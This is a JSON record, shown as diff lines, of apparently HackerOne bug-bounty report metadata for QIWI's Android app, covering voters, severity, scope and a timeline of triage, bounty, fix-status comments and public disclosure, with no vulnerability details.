+    "allow_singular_disclosure_after": -65205148.28187165,
+    "singular_disclosure_allowed": true,
+    "vote_count": 26,
+    "voters": [
+        "osman1337",
+        "sw33tlie",
+        "tess",
+        "shell_c0de",
+        "theappsec",
+        "xsstestov",
+        "savproga",
+        "i5nipe",
+        "0xwise",
+        "citril",
+        "and 16 more..."
+    ],
+    "severity": {
+        "rating": "high",
+        "author_type": "User"
+    },
+    "structured_scope": {
+        "databaseId": 18742,
+        "asset_type": "GOOGLE_PLAY_APP_ID",
+        "asset_identifier": "ru.mw",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 4010127,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2019-01-21T08:23:42.150Z",
+            "updated_at": "2019-01-21T08:23:42.150Z",
+            "actor": {
+                "username": "gmedian",
+                "cleared": false,
+                "verified": false,
+                "url": "/gmedian",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "qiwi"
+        },
+        {
+            "id": 4037659,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "Спасибо за помощь!",
+            "automated_response": false,
+            "created_at": "2019-01-25T15:33:16.535Z",
+            "updated_at": "2019-01-25T15:33:16.535Z",
+            "actor": {
+                "url": "/qiwi",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/215/f578bbb9421365fab2e51aa7482bea82006d7c0c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "QIWI"
+                }
+            },
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "qiwi",
+            "collaborator": {
+                "username": "shell_c0de",
+                "url": "/shell_c0de"
+            }
+        },
+        {
+            "id": 4038015,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Вам спасибо. Буду ждать исправления.\n\nС уважением,\n@shell_c0de ",
+            "automated_response": false,
+            "created_at": "2019-01-25T16:49:43.576Z",
+            "updated_at": "2019-01-25T16:49:43.576Z",
+            "actor": {
+                "username": "shell_c0de",
+                "cleared": false,
+                "verified": false,
+                "url": "/shell_c0de",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/286/336/6c31698bb7e83a8bb394303ec2b1a31513a1bb99_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "qiwi"
+        },
+        {
+            "id": 4192982,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ExternalUserJoined",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2019-02-22T15:55:05.635Z",
+            "updated_at": "2019-02-22T15:55:05.635Z",
+            "additional_data": {
+                "report_permissions": null,
+                "duplicate_report_id": 499815
+            },
+            "actor": {
+                "username": "nearsecurity",
+                "cleared": false,
+                "verified": false,
+                "url": "/nearsecurity",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "qiwi"
+        },
+        {
+            "id": 4247862,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Вы не думали присоединиться к [Google Play Security Reward Program](https://hackerone.com/googleplay)? Думаю это сделает ваши приложения более безопасными, а исследователи будут больше заинтересованы в поисках уязвимостей.\n\nС уважением,\n@shell_c0de",
+            "automated_response": false,
+            "created_at": "2019-03-03T18:48:48.370Z",
+            "updated_at": "2019-03-03T18:53:50.376Z",
+            "actor": {
+                "username": "shell_c0de",
+                "cleared": false,
+                "verified": false,
+                "url": "/shell_c0de",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/286/336/6c31698bb7e83a8bb394303ec2b1a31513a1bb99_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "qiwi"
+        },
+        {
+            "id": 4253118,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Спасибо! Отличная идея, подумаем над этим.\n\nПо поводу бага - скорее всего фикс появится в ближайшем релизе.",
+            "automated_response": false,
+            "created_at": "2019-03-04T15:01:02.839Z",
+            "updated_at": "2019-03-04T15:01:02.839Z",
+            "actor": {
+                "username": "vankyver",
+                "cleared": false,
+                "verified": false,
+                "url": "/vankyver",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "qiwi"
+        },
+        {
+            "id": 4253129,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Хорошо, спасибо, ожидаю фикса.",
+            "automated_response": false,
+            "created_at": "2019-03-04T15:02:06.114Z",
+            "updated_at": "2019-03-04T15:02:06.114Z",
+            "actor": {
+                "username": "shell_c0de",
+                "cleared": false,
+                "verified": false,
+                "url": "/shell_c0de",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/286/336/6c31698bb7e83a8bb394303ec2b1a31513a1bb99_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "qiwi"
+        },
+        {
+            "id": 5648162,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "Уязвимость исправлена в одном из предыдущих релизов.\nЕще раз спасибо за помощь!",
+            "automated_response": false,
+            "created_at": "2019-08-23T13:01:42.443Z",
+            "updated_at": "2019-08-23T13:01:42.443Z",
+            "actor": {
+                "username": "vankyver",
+                "cleared": false,
+                "verified": false,
+                "url": "/vankyver",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "shell_c0de",
+                "url": "/shell_c0de"
+            },
+            "genius_execution_id": null,
+            "team_handle": "qiwi"
+        },
+        {
+            "id": 12358758,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "Hi @vankyver, @gmedian,\nFull disclosure, please?\n\nKind regards,\n@shell_c0de",
+            "automated_response": false,
+            "created_at": "2021-07-05T14:36:23.885Z",
+            "updated_at": "2021-07-05T14:36:23.885Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "shell_c0de",
+                "cleared": false,
+                "verified": false,
+                "url": "/shell_c0de",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/286/336/6c31698bb7e83a8bb394303ec2b1a31513a1bb99_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "qiwi"
+        },
+        {
+            "id": 12371444,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "Sure! ;)",
+            "automated_response": false,
+            "created_at": "2021-07-06T14:11:10.924Z",
+            "updated_at": "2021-07-06T14:11:10.924Z",
+            "actor": {
+                "username": "vankyver",
+                "cleared": false,
+                "verified": false,
+                "url": "/vankyver",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "qiwi"
+        },
+        {
+            "id": 12371445,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-07-06T14:11:11.112Z",
+            "updated_at": "2021-07-06T14:11:11.112Z",
+            "actor": {
+                "username": "vankyver",
+                "cleared": false,
+                "verified": false,
+                "url": "/vankyver",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "qiwi"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
